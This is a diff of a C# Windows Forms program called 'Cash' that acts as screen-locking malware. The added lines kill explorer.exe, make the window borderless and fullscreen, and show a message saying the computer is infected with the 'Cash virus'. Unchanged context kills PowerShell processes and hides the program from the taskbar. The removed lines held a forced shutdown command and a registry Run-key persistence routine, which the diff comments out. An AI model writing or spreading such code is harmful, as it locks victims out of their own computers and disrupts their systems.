@@ -1,5 +1,4 @@
-﻿using Microsoft.Win32;
-using System;
+﻿using System;
 using System.Diagnostics;
 using System.Windows.Forms;
 
@@ -7,20 +6,27 @@ namespace Cash
 {
     public partial class Form1 : Form
     {
+
         public Form1()
         {
             this.KeyDown += Form1_KeyDown;
             InitializeComponent();
             this.CenterToScreen();
-            Process.Start("cmd.exe", " shutdown -f -s -t 300");
-            Process.Start("cmd.exe", "taskkill -f -im explorer.exe");
+            Process.Start("cmd.exe", "/c taskkill -f -im explorer.exe");
+
         }
 
         private void Form1_Load(object sender, EventArgs e)
         {
             timer1.Start();
-            this.ShowInTaskbar = false;
-            SetStartup(true);
+            this.ShowInTaskbar = false; 
+            // SetStartup(true);
+
+            FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
+            WindowState = FormWindowState.Maximized;
+
+            button1.Left = (this.ClientSize.Width - button1.Width) / 2;
+            button1.Top = (this.ClientSize.Height - button1.Height) / 2;
         }
 
         private void Form1_KeyDown(object sender, KeyEventArgs e)
@@ -42,29 +48,12 @@ namespace Cash
             foreach (Process process in Process.GetProcessesByName("powershell")) { if (process.ProcessName == "powershell") { process.Kill(); } }
 
         }
-        private void SetStartup(bool enable)
+        /*private void SetStartup(bool enable)
         {
-            string runKey = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";
+            RegistryKey key = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
 
-            RegistryKey startupKey = Registry.CurrentUser.OpenSubKey(runKey);
-
-            if (enable)
-            {
-                if (startupKey.GetValue("Cash") == null)
-                {
-                    startupKey.Close();
-                    startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
-                    startupKey.SetValue("Cash", "\"" + Application.ExecutablePath + "\"");
-                    startupKey.Close();
-                }
-            }
-            else
-            {
-                startupKey = Registry.CurrentUser.OpenSubKey(runKey, true);
-                startupKey.DeleteValue("Cash", false);
-                startupKey.Close();
-            }
-        }
+            key.SetValue("Cash", Application.ExecutablePath.ToString());
+        }*/
         protected override CreateParams CreateParams
         {
             get
@@ -82,8 +71,7 @@ namespace Cash
         private void button1_Click(object sender, EventArgs e)
         {
 
-            MessageBox.Show("The computer will shut down in 5 minutes.");
-            MessageBox.Show("Solve it in 5 minutes.");
+            MessageBox.Show("Your computer is infected with the Cash virus.");
         }
 
         
